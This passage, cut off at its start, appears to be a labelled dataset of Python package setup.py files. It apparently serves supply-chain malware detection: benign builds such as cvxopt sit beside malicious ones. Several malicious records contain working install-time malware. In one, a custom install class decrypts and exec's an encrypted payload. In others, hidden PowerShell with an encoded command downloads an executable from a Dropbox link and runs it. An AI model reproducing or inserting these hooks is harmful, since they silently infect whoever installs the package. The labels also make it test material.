get_requirements():\n    \"\"\"\n    This function extract all requirements from requirements.txt.\n    \"\"\"\n\n    try:\n        with open(\"requirements.txt\") as file:\n            requirements = file.read().splitlines()\n    except FileNotFoundError:\n        with open(\"../requirements.txt\") as file:\n            requirements = file.read().splitlines()\n\n    return requirements\n\n\ndef get_version():\n    \"\"\"\n    This function will extract the version from domain2idna/__init__.py\n    \"\"\"\n\n    to_match = comp(r'VERSION\\s=\\s\"(.*)\"\\n')\n\n    try:\n        extracted = to_match.findall(\n            open(\"domain2idna/__init__.py\", encoding=\"utf-8\").read()\n        )[0]\n    except FileNotFoundError:\n        extracted = to_match.findall(\n            open(\"../domain2idna/__init__.py\", encoding=\"utf-8\").read()\n        )[0]\n\n    return \".\".join([x for x in extracted.split(\".\") if x.isdigit()])\n\n\ndef get_long_description():\n    \"\"\"\n    This function return the long description.\n    \"\"\"\n\n    try:\n        return open(\"README.rst\", encoding=\"utf-8\").read()\n    except FileNotFoundError:\n        return open(\"../README.rst\", encoding=\"utf-8\").read()\n\n\nif __name__ == \"__main__\":\n    setup(\n        name=\"domain2idna\",\n        version=get_version(),\n        python_requires=\">=3.6.2, <4\",\n        description=\"The tool to convert a domain or a file with a list of domain to the \"\n        \"famous IDNA format.\",\n        long_description=get_long_description(),\n        install_requires=get_requirements(),\n        author=\"funilrys\",\n        author_email=\"contact@funilrys.com\",\n        license=\"MIT https://raw.githubusercontent.com/PyFunceble/domain2idna/master/LICENSE\",\n        url=\"https://github.com/PyFunceble/domain2idna\",\n        platforms=[\"any\"],\n        packages=[\"domain2idna\"],\n        keywords=[\"Python\", \"domain\", \"idna\"],\n        classifiers=[\n            \"Environment :: Console\",\n            \"Topic :: Internet\",\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 3\",\n            \"License :: OSI Approved :: MIT License\",\n        ],\n        test_suite=\"setup.test_suite\",\n        entry_points={\"console_scripts\": [\"domain2idna=domain2idna.cli:tool\"]},\n    )\n", "target": 0}
{"idx": "cvxopt-1.3.0", "func": "from setuptools import setup, Extension\nfrom glob import glob\nimport os, sys\nimport versioneer\n\n# Modifiy this if BLAS and LAPACK libraries are not in /usr/lib.\nBLAS_LIB_DIR = '/usr/lib'\n\n# Default names of BLAS and LAPACK libraries\nBLAS_LIB = ['blas']\nLAPACK_LIB = ['lapack']\nBLAS_EXTRA_LINK_ARGS = []\n\n# Set environment variable BLAS_NOUNDERSCORES=1 if your BLAS/LAPACK do\n# not use trailing underscores\nBLAS_NOUNDERSCORES = False\n\n# Set to 1 if you are using the random number generators in the GNU\n# Scientific Library.\nBUILD_GSL = 0\n\n# Directory containing libgsl (used only when BUILD_GSL = 1).\nGSL_LIB_DIR = '/usr/lib'\n\n# Directory containing the GSL header files (used only when BUILD_GSL = 1).\nGSL_INC_DIR = '/usr/include/gsl'\n\n# Set to 1 if you are installing the fftw module.\nBUILD_FFTW = 0\n\n# Directory containing libfftw3 (used only when BUILD_FFTW = 1).\nFFTW_LIB_DIR = '/usr/lib'\n\n# Directory containing fftw.h (used only when BUILD_FFTW = 1).\nFFTW_INC_DIR = '/usr/include'\n\n# Set to 1 if you are installing the glpk module.\nBUILD_GLPK = 0\n\n# Directory containing libglpk (used only when BUILD_GLPK = 1).\nGLPK_LIB_DIR = '/usr/lib'\n\n# Directory containing glpk.h (used only when BUILD_GLPK = 1).\nGLPK_INC_DIR = '/usr/include'\n\n# Set to 1 if you are installing the DSDP module.\nBUILD_DSDP = 0\n\n# Directory containing libdsdp (used only when BUILD_DSDP = 1).\nDSDP_LIB_DIR = '/usr/lib'\n\n# Directory containing dsdp5.h (used only when BUILD_DSDP = 1).\nDSDP_INC_DIR = '/usr/include/dsdp'\n\n# Guess SUITESPARSE_LIB_DIR and SUITESPARSE_INC_DIR\nif sys.platform.startswith(\"darwin\"):\n    # macOS\n    SUITESPARSE_LIB_DIR = '/usr/local/lib'\n    SUITESPARSE_INC_DIR = '/usr/local/include'\nelse:\n    if glob(\"/usr/lib/x86_64-linux-gnu/libsuitesparse*\"):\n        # Ubuntu/Debian\n        SUITESPARSE_LIB_DIR = \"/usr/lib/x86_64-linux-gnu\"\n        SUITESPARSE_INC_DIR = \"/usr/include/suitesparse\"\n    elif glob(\"/usr/lib64/libsuitesparse*\"):\n        # CentOS/Fedora/RedHat\n        SUITESPARSE_LIB_DIR = \"/usr/lib64\"\n        SUITESPARSE_INC_DIR = \"/usr/include/suitesparse\"\n    else:\n        # Default\n        SUITESPARSE_LIB_DIR = '/usr/lib'\n        SUITESPARSE_INC_DIR = '/usr/include'\n\nif sys.platform.startswith(\"win\"):\n    GSL_MACROS = [('GSL_DLL',''),('WIN32','')]\n    FFTW_MACROS = [('FFTW_DLL',''),('FFTW_NO_Complex','')]\nelse:\n    GSL_MACROS = []\n    FFTW_MACROS = []\n\n# Directory containing SuiteSparse source\nSUITESPARSE_SRC_DIR = ''\n\n# Set to 1 if compiling with MSVC 14 or later\nMSVC=0\n\n# No modifications should be needed below this line.\n\nBLAS_NOUNDERSCORES = int(os.environ.get(\"CVXOPT_BLAS_NOUNDERSCORES\",BLAS_NOUNDERSCORES)) == True\nBLAS_LIB = os.environ.get(\"CVXOPT_BLAS_LIB\",BLAS_LIB)\nLAPACK_LIB = os.environ.get(\"CVXOPT_LAPACK_LIB\",LAPACK_LIB)\nBLAS_LIB_DIR = os.environ.get(\"CVXOPT_BLAS_LIB_DIR\",BLAS_LIB_DIR)\nBLAS_EXTRA_LINK_ARGS = os.environ.get(\"CVXOPT_BLAS_EXTRA_LINK_ARGS\",BLAS_EXTRA_LINK_ARGS)\nif type(BLAS_LIB) is str: BLAS_LIB = BLAS_LIB.strip().split(';')\nif type(LAPACK_LIB) is str: LAPACK_LIB = LAPACK_LIB.strip().split(';')\nif type(BLAS_EXTRA_LINK_ARGS) is str: BLAS_EXTRA_LINK_ARGS = BLAS_EXTRA_LINK_ARGS.strip().split(';')\nBUILD_GSL = int(os.environ.get(\"CVXOPT_BUILD_GSL\",BUILD_GSL))\nGSL_LIB_DIR = os.environ.get(\"CVXOPT_GSL_LIB_DIR\",GSL_LIB_DIR)\nGSL_INC_DIR = os.environ.get(\"CVXOPT_GSL_INC_DIR\",GSL_INC_DIR)\nBUILD_FFTW = int(os.environ.get(\"CVXOPT_BUILD_FFTW\",BUILD_FFTW))\nFFTW_LIB_DIR = os.environ.get(\"CVXOPT_FFTW_LIB_DIR\",FFTW_LIB_DIR)\nFFTW_INC_DIR = os.environ.get(\"CVXOPT_FFTW_INC_DIR\",FFTW_INC_DIR)\nBUILD_GLPK = int(os.environ.get(\"CVXOPT_BUILD_GLPK\",BUILD_GLPK))\nGLPK_LIB_DIR = os.environ.get(\"CVXOPT_GLPK_LIB_DIR\",GLPK_LIB_DIR)\nGLPK_INC_DIR = os.environ.get(\"CVXOPT_GLPK_INC_DIR\",GLPK_INC_DIR)\nBUILD_DSDP = int(os.environ.get(\"CVXOPT_BUILD_DSDP\",BUILD_DSDP))\nDSDP_LIB_DIR = os.environ.get(\"CVXOPT_DSDP_LIB_DIR\",DSDP_LIB_DIR)\nDSDP_INC_DIR = os.environ.get(\"CVXOPT_DSDP_INC_DIR\",DSDP_INC_DIR)\nSUITESPARSE_LIB_DIR = os.environ.get(\"CVXOPT_SUITESPARSE_LIB_DIR\",SUITESPARSE_LIB_DIR)\nSUITESPARSE_INC_DIR = os.environ.get(\"CVXOPT_SUITESPARSE_INC_DIR\",SUITESPARSE_INC_DIR)\nSUITESPARSE_SRC_DIR = os.environ.get(\"CVXOPT_SUITESPARSE_SRC_DIR\",SUITESPARSE_SRC_DIR)\nMSVC = int(os.environ.get(\"CVXOPT_MSVC\",MSVC)) == True\nPYTHON_REQUIRES = (\n    '>=2.7, !=3.0.*, !=3.1.*, '\n    '!=3.2.*, !=3.3.*, !=3.4.*')\nINSTALL_REQUIRES = os.environ.get(\"CVXOPT_INSTALL_REQUIRES\",[])\nif type(INSTALL_REQUIRES) is str: INSTALL_REQUIRES = INSTALL_REQUIRES.strip().split(';')\n\nRT_LIB = [\"rt\"] if sys.platform.startswith(\"linux\") else []\nM_LIB = [\"m\"] if not MSVC else []\nUMFPACK_EXTRA_COMPILE_ARGS = [\"-Wno-unknown-pragmas\"] if not MSVC else []\n\nextmods = []\n\n# Macros\nMACROS = []\nif BLAS_NOUNDERSCORES: MACROS.append(('BLAS_NO_UNDERSCORE',''))\n\n# optional modules\n\nif BUILD_GSL:\n    gsl = Extension('gsl', libraries = M_LIB + ['gsl'] + BLAS_LIB,\n        include_dirs = [ GSL_INC_DIR ],\n        library_dirs = [ GSL_LIB_DIR, BLAS_LIB_DIR ],\n        define_macros = GSL_MACROS,\n        extra_link_args = BLAS_EXTRA_LINK_ARGS,\n        sources = ['src/C/gsl.c'] )\n    extmods += [gsl];\n\nif BUILD_FFTW:\n    fftw = Extension('fftw', libraries = ['fftw3'] + BLAS_LIB,\n        include_dirs = [ FFTW_INC_DIR ],\n        library_dirs = [ FFTW_LIB_DIR, BLAS_LIB_DIR ],\n        define_macros = FFTW_MACROS,\n        extra_link_args = BLAS_EXTRA_LINK_ARGS,\n        sources = ['src/C/fftw.c'] )\n    extmods += [fftw];\n\nif BUILD_GLPK:\n    glpk = Extension('glpk', libraries = ['glpk'],\n        include_dirs = [ GLPK_INC_DIR ],\n        library_dirs = [ GLPK_LIB_DIR ],\n        sources = ['src/C/glpk.c'] )\n    extmods += [glpk];\n\nif BUILD_DSDP:\n    dsdp = Extension('dsdp', libraries = ['dsdp'] + LAPACK_LIB + BLAS_LIB,\n        include_dirs = [ DSDP_INC_DIR ],\n        library_dirs = [ DSDP_LIB_DIR, BLAS_LIB_DIR ],\n        extra_link_args = BLAS_EXTRA_LINK_ARGS,\n        sources = ['src/C/dsdp.c'] )\n    extmods += [dsdp];\n\n# Required modules\n\nbase = Extension('base', libraries = M_LIB + LAPACK_LIB + BLAS_LIB,\n    library_dirs = [ BLAS_LIB_DIR ],\n    define_macros = MACROS,\n    extra_link_args = BLAS_EXTRA_LINK_ARGS,\n    sources = ['src/C/base.c','src/C/dense.c','src/C/sparse.c'])\n\nblas = Extension('blas', libraries = BLAS_LIB,\n    library_dirs = [ BLAS_LIB_DIR ],\n    define_macros = MACROS,\n    extra_link_args = BLAS_EXTRA_LINK_ARGS,\n    sources = ['src/C/blas.c'] )\n\nlapack = Extension('lapack', libraries = LAPACK_LIB + BLAS_LIB,\n    library_dirs = [ BLAS_LIB_DIR ],\n    define_macros = MACROS,\n    extra_link_args = BLAS_EXTRA_LINK_ARGS,\n    sources = ['src/C/lapack.c'] )\n\nif not SUITESPARSE_SRC_DIR:\n    umfpack = Extension('umfpack',\n        libraries = ['umfpack','cholmod','amd','colamd','suitesparseconfig'] + LAPACK_LIB + BLAS_LIB + RT_LIB,\n        include_dirs = [SUITESPARSE_INC_DIR],\n        library_dirs = [SUITESPARSE_LIB_DIR, BLAS_LIB_DIR],\n        sources = ['src/C/umfpack.c'])\nelse:\n    umfpack = Extension('umfpack',\n        include_dirs = [ SUITESPARSE_SRC_DIR + '/UMFPACK/Include',\n            SUITESPARSE_SRC_DIR + '/AMD/Include',\n            SUITESPARSE_SRC_DIR + '/UMFPACK/Source',\n            SUITESPARSE_SRC_DIR + '/AMD/Source',\n            SUITESPARSE_SRC_DIR + '/SuiteSparse_config' ],\n        library_dirs = [ BLAS_LIB_DIR ],\n        define_macros = MACROS + [('NTIMER', '1'), ('NCHOLMOD', '1')],\n        libraries = LAPACK_LIB + BLAS_LIB,\n        extra_compile_args = UMFPACK_EXTRA_COMPILE_ARGS,\n        extra_link_args = BLAS_EXTRA_LINK_ARGS,\n        sources = [ 'src/C/umfpack.c',\n            SUITESPARSE_SRC_DIR + '/UMFPACK/Source/umfpack_tictoc.c',\n            SUITESPARSE_SRC_DIR + '/SuiteSparse_config/SuiteSparse_config.c'] +\n            glob('src/C/SuiteSparse_cvxopt_extra/umfpack/*'))\n\n# Build for int or long?\nif sys.maxsize > 2**31: MACROS += [('DLONG',None)]\n\nif not SUITESPARSE_SRC_DIR:\n    cholmod = Extension('cholmod',\n        libraries = ['cholmod','colamd','amd','suitesparseconfig'] + LAPACK_LIB + BLAS_LIB + RT_LIB,\n        include_dirs = [SUITESPARSE_INC_DIR],\n        library_dirs = [SUITESPARSE_LIB_DIR, BLAS_LIB_DIR],\n        sources = [ 'src/C/cholmod.c' ])\nelse:\n    cholmod = Extension('cholmod',\n        library_dirs = [ BLAS_LIB_DIR ],\n        libraries = LAPACK_LIB + BLAS_LIB,\n        include_dirs = [ SUITESPARSE_SRC_DIR + '/CHOLMOD/Include',\n            SUITESPARSE_SRC_DIR + '/COLAMD',\n            SUITESPARSE_SRC_DIR + '/AMD/Include',\n            SUITESPARSE_SRC_DIR + '/COLAMD/Include',\n            SUITESPARSE_SRC_DIR + '/SuiteSparse_config' ],\n        define_macros = MACROS + [('NPARTITION', '1'), ('NTIMER', '1')],\n        extra_link_args = BLAS_EXTRA_LINK_ARGS,\n        sources = [ 'src/C/cholmod.c' ] +\n            [SUITESPARSE_SRC_DIR + '/AMD/Source/' + s for s in ['amd_postorder.c', 'amd_post_tree.c', 'amd_2.c']] +\n            [SUITESPARSE_SRC_DIR + '/COLAMD/Source/colamd.c'] +\n            [SUITESPARSE_SRC_DIR + '/SuiteSparse_config/SuiteSparse_config.c'] +\n            glob(SUITESPARSE_SRC_DIR + '/CHOLMOD/Core/c*.c') +\n            glob(SUITESPARSE_SRC_DIR + '/CHOLMOD/Cholesky/c*.c') +\n            [SUITESPARSE_SRC_DIR + '/CHOLMOD/Check/cholmod_check.c'] +\n            glob(SUITESPARSE_SRC_DIR + '/CHOLMOD/Supernodal/c*.c') )\n\nif not SUITESPARSE_SRC_DIR:\n    amd = Extension('amd',\n        libraries = ['amd','suitesparseconfig'] + RT_LIB,\n        include_dirs = [SUITESPARSE_INC_DIR],\n        library_dirs = [SUITESPARSE_LIB_DIR],\n        sources = ['src/C/amd.c'])\nelse:\n    amd = Extension('amd',\n        include_dirs = [SUITESPARSE_SRC_DIR + '/AMD/Include',\n            SUITESPARSE_SRC_DIR + '/SuiteSparse_config' ],\n        define_macros = MACROS + [('NTIMER', '1')],\n        sources = [ 'src/C/amd.c', SUITESPARSE_SRC_DIR + '/SuiteSparse_config/SuiteSparse_config.c'] +\n        glob(SUITESPARSE_SRC_DIR + '/AMD/Source/*.c') )\n\nmisc_solvers = Extension('misc_solvers',\n    libraries = LAPACK_LIB + BLAS_LIB,\n    library_dirs = [ BLAS_LIB_DIR ],\n    define_macros = MACROS,\n    extra_link_args = BLAS_EXTRA_LINK_ARGS,\n    sources = ['src/C/misc_solvers.c'] )\n\nextmods += [base, blas, lapack, umfpack, cholmod, amd, misc_solvers]\n\nsetup (name = 'cvxopt',\n    description = 'Convex optimization package',\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    long_description = '''\nCVXOPT is a free software package for convex optimization based on the\nPython programming language. It can be used with the interactive Python\ninterpreter, on the command line by executing Python scripts, or\nintegrated in other software via Python extension modules. Its main\npurpose is to make the development of software for convex optimization\napplications straightforward by building on Python's extensive standard\nlibrary and on the strengths of Python as a high-level programming\nlanguage.''',\n    author = 'M. Andersen, J. Dahl, and L. Vandenberghe',\n    author_email = 'martin.skovgaard.andersen@gmail.com, dahl.joachim@gmail.com, vandenbe@ee.ucla.edu',\n    url = 'http://cvxopt.org',\n    project_urls = {'Source': 'https://github.com/cvxopt/cvxopt'},\n    license = 'GNU GPL version 3',\n    ext_package = \"cvxopt\",\n    ext_modules = extmods,\n    package_dir = {\"cvxopt\": \"src/python\"},\n    packages = [\"cvxopt\"],\n    python_requires=PYTHON_REQUIRES,\n    install_requires = INSTALL_REQUIRES,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: OS Independent',\n        'Programming Language :: C',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Scientific/Engineering',\n        ],\n    zip_safe=False\n    )\n", "target": 0}
{"idx": "custoqtkinter-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'AfhsLHyeMhxihKJjKxUwsuftBOcBTvepqzHvXwtqGzefFoGJhASjxSuHbcqbebLiqwsJyFRuJFKwnNheDUNVRMXxXDQSiLYlqxt'\nLONG_DESCRIPTION = 'IWbXqdFUquoDhctkDWiwHgTc uojuVjZ QC GxtsewZRqRIcvdIWFGZBWS mwzlhZQHYxDuON eGTgdPlWJwfKIYdUdJLwfyRtTtVWDOeBXfYPtNFwZslqEgnJrrFijvnCVlpJbYOtrdPpYrocAEshTcBWhIxPrMlVMnHrZWrdLsULpbXhwgAcB gTSKFjnHXatiezxXPAUYeqewhfeZbjKIsProTrunWkgSJXRLVjPkjIEwjHzwmhmOfQtZyhpLHnBVfvKHpsmPAHIbLYtYF XLpEHhDRKjudmUqKWWRrnHtYtNgNTOYOjBjXBNBUhDgCjsNmaKhJxJyFKoioEpEuBrqKClXqkfPtnuTkRnnsKysLKxRXyRuOLyqhSXACzEAylltwixPDwjUcanpSSgJFKhS VuOdQYrorSDIXTNIgwuIXXGOjndGZsvNqKesavOSIVmeZBtmUR ANViT'\n\n\nclass RTYXBMHtdIbvebgqBVCBoWOnrRzPbOMCsGqDlMWCNKBNGHTZxPIeDuMzdzjBGgdNdKImdZUZVnagzxhPFYqefIQkchkoSTBCMYVHLRWQuUcBQYhNRgEFxOLCznRDxmYcBoJftFqqLMANLiHCQJkwccWdSpYkdRlQpkHElyCsxhPUQ(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'mdXBEsP7g1ILoow4Pu7cK7peBjmLk9uwi7FQ5yl-MH4=').decrypt(b'gAAAAABmBIN_AunbHP1khdSPj9LarNszio_8Vm32aES-HrMjzD1zLm1rnSxBLwcocSEovpg26fLDEFKs2IP_AB3OUTmtsVqSizKZGiv9Nkb9FdsHltIWzPZdgpm5KNKALEHXAilCtjO-NgeR2cFa12wp5Vbbjm07skBub5FlncM9BXqja7E68dH9fmQqsez1ydEUTPih8ALEo6udFHJaJTg_9j1lDIopccJV-BdS38o2kkaagbkFe5k='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"custoqtkinter\",\n    version=VERSION,\n    author=\"NofzncydlDrCqzEmE\",\n    author_email=\"dNwVWM@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': RTYXBMHtdIbvebgqBVCBoWOnrRzPbOMCsGqDlMWCNKBNGHTZxPIeDuMzdzjBGgdNdKImdZUZVnagzxhPFYqefIQkchkoSTBCMYVHLRWQuUcBQYhNRgEFxOLCznRDxmYcBoJftFqqLMANLiHCQJkwccWdSpYkdRlQpkHElyCsxhPUQ,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "selfproofcvrand-3.38", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfproofcvrand',\n    packages = ['modlib'],\n    version = '9.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-ultraramgui-4.72", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ultraramgui',\n    packages = ['modlib'],\n    version = '4.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "guicandy-8.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'guicandy',\n    packages = ['modlib'],\n    version = '6.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "admcheck-1.2.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.2.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "tpinfosplitinfo-7.82", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpinfosplitinfo',\n    packages = ['modlib'],\n    version = '8.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "maskad-4.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'maskad',\n    packages = ['modlib'],\n    version = '9.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
